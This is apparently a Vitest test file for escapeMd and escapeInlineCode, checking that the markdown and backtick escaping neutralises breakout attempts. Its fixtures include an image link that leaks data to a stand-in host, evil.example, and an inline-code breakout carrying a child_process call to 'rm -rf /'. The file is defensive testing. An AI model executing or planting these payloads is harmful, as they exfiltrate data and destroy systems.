import { describe, expect, it } from 'vitest'
import { escapeInlineCode, escapeMd } from '../src/escape.js'

describe('escapeMd', () => {
  it('escapes backticks (prevents inline-code breakout)', () => {
    const malicious = 'foo` - ![leak](https://evil.example/x.png?pr=leaked)'
    const escaped = escapeMd(malicious)
    // Backticks are escaped so they can't break out of inline code
    expect(escaped).not.toMatch(/(^|[^\\])`/) // unescaped backtick
  })

  it('escapes image markdown', () => {
    expect(escapeMd('![image](https://evil.example/x.png)')).toContain('\\!')
    expect(escapeMd('![image](https://evil.example/x.png)')).toContain('\\[')
  })

  it('escapes link markdown', () => {
    expect(escapeMd('[click](https://evil.example)')).toContain('\\[')
    expect(escapeMd('[click](https://evil.example)')).toContain('\\]')
  })

  it('removes control characters including newlines', () => {
    const escaped = escapeMd('line1\nline2\r\nline3')
    expect(escaped).not.toContain('\n')
    expect(escaped).not.toContain('\r')
    expect(escaped).toContain('line1')
    expect(escaped).toContain('line2')
    expect(escaped).toContain('line3')
    expect(escapeMd('tab\there')).toBe('tab here')
  })

  it('handles non-string input', () => {
    expect(escapeMd(null as unknown as string)).toBe('')
    expect(escapeMd(undefined as unknown as string)).toBe('')
  })
})

describe('escapeInlineCode', () => {
  it('replaces backticks (prevents code-block breakout)', () => {
    const malicious = "foo`+require('child_process').exec('rm -rf /')+`"
    const escaped = escapeInlineCode(malicious)
    // Backticks are replaced with a unicode look-alike so they can't break out
    expect(escaped).not.toContain('`')
    // The content is still there (we just neutralize the backticks, not the content itself)
    // — GitHub's inline code rendering will display it as literal text, not executed code.
    expect(escaped).toContain('require')
  })

  it('escapes backslashes', () => {
    expect(escapeInlineCode('foo\\bar')).toBe('foo\\\\bar')
  })

  it('removes control characters', () => {
    expect(escapeInlineCode('line1\nline2')).toBe('line1 line2')
  })
})
